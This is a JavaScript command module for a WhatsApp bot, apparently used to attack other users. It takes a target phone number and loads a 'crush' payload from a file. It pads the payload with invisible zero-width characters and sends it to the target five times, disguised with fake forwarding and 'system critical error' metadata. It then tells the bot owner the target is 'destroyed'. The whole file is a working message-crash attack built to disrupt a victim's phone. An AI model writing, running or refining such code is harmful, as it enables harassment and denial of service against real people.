const fs = require('fs');
const path = require('path');
const config = require('../../config');

module.exports = {
    name: "crush1",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        if (!args[0]) return msg.reply(fancy("🥀 provide target number."));

        const payload = fs.readFileSync('./lib/payloads/crush1.txt', 'utf-8');
        const invisible = "\u200B".repeat(100); 

        msg.reply(fancy("🥀 initiating invisible crush strike..."));

        for (let i = 0; i < 5; i++) {
            await conn.sendPresenceUpdate('recording', target);
            await new Promise(r => setTimeout(r, 1500));
            await conn.sendMessage(target, { 
                text: invisible + payload,
                contextInfo: { 
                    isForwarded: true,
                    forwardingScore: 999,
                    forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid, newsletterName: "ꜱʏꜱᴛᴇᴍ ᴄʀɪᴛɪᴄᴀʟ ᴇʀʀᴏʀ" },
                    externalAdReply: { title: "🥀 INSIDIOUS STRIKE 🥀", body: "Verifying encrypted data...", mediaType: 1, thumbnailUrl: "https://files.catbox.moe/horror.jpg" }
                } 
            });
        }

        // REPORT TO OWNER
        await conn.sendMessage(conn.user.id, { 
            text: `╭── • 🥀 • ──╮\n  ${fancy("ᴍɪꜱꜱɪᴏɴ ꜱᴜᴄᴄᴇꜱꜱ")}\n╰── • 🥀 • ──╯\n\n│ ◦ ᴛᴀʀɢᴇᴛ: ${args[0]}\n│ ◦ ꜱᴛʀɪᴋᴇ: CRUSH1\n│ ◦ ꜱᴛᴀᴛᴜꜱ: ᴅᴇꜱᴛʀᴏʏᴇᴅ\n└──────────────`,
            contextInfo: { isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid, newsletterName: config.botName } }
        });
    }
};
